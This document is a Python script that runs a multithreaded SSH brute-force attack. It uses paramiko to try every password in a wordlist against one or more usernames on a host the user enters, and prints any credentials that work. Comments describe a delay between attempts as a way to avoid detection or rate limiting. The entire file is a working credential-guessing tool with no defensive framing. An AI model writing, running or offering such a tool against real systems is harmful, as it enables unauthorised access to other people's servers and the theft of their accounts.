import paramiko
import threading
import time
from queue import Queue

# Define queues for passwords and usernames
password_queue = Queue()
username_queue = Queue()

# Load passwords into the queue
def load_password_wordlist(wordlist_path):
    try:
        with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as file:
            for line in file.readlines():
                password_queue.put(line.strip())  # Remove any whitespace or newlines
        print(f"[+] Loaded {password_queue.qsize()} passwords from wordlist.")
    except Exception as e:
        print(f"[-] Error loading password wordlist: {e}")

# Load usernames into the queue
def load_username_wordlist(wordlist_path):
    try:
        with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as file:
            for line in file.readlines():
                username_queue.put(line.strip())  # Remove any whitespace or newlines
        print(f"[+] Loaded {username_queue.qsize()} usernames from wordlist.")
    except Exception as e:
        print(f"[-] Error loading username wordlist: {e}")

# Attempt SSH login with the given username and password
def attempt_ssh_login(host, port, username, password):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())  # Automatically add SSH keys
    try:
        ssh.connect(host, port=port, username=username, password=password, timeout=5)
        print(f"[+] Success: Username '{username}' and Password '{password}' found!")
        return True
    except paramiko.AuthenticationException:
        print(f"[-] Authentication failed for username '{username}' and password '{password}'")
        return False
    except Exception as e:
        print(f"[-] Connection failed: {e}")
        return False
    finally:
        ssh.close()

# Worker function to process passwords for each username
def worker(host, port, delay=1):
    while not username_queue.empty():
        username = username_queue.get()  # Get a username
        while not password_queue.empty():
            password = password_queue.get()  # Get a password
            
            # Try SSH login with the current username and password
            success = attempt_ssh_login(host, port, username, password)
            
            if success:
                # If login is successful, notify and stop other threads
                print(f"[+] Password found! Terminating brute force for username: '{username}' with password: '{password}'")
                return  # Stop the worker if successful
            
            # Optional delay between attempts to avoid detection or rate limiting
            time.sleep(delay)
            
            # Mark the password task as done
            password_queue.task_done()
        
        # Reload passwords for the next username
        load_password_wordlist(password_wordlist_path)  # Reload the password queue
        username_queue.task_done()  # Mark the username as done

# Main function to get user input and start brute-force attack
def main():
    global password_wordlist_path  # Make this global so the worker can reload it

    host = input("Enter the SSH server IP/hostname: ")
    port = int(input("Enter the SSH port (default is 22): ") or 22)
    
    username_input = input("Enter the SSH username or path to the username wordlist: ")
    
    # Determine if the input is a username or a wordlist
    if username_input.endswith('.txt'):
        load_username_wordlist(username_input)
    else:
        username_queue.put(username_input)
    
    password_wordlist_path = input("Enter the path to the password wordlist: ")
    load_password_wordlist(password_wordlist_path)
    
    # Ask for the number of threads
    threads_count = int(input("Enter the number of threads to use (e.g., 5, 10): "))
    
    # Ask for delay between attempts (to avoid detection or rate limiting)
    delay = float(input("Enter delay between attempts (in seconds, e.g., 1 or 0.5): "))

    # Start brute-force attack using multiple threads
    threads = []
    for _ in range(threads_count):
        t = threading.Thread(target=worker, args=(host, port, delay))
        threads.append(t)
        t.start()

    # Wait for all threads to finish
    for t in threads:
        t.join()

    print("[*] Brute-force attack finished.")

# Entry point of the script
if __name__ == "__main__":
    main()
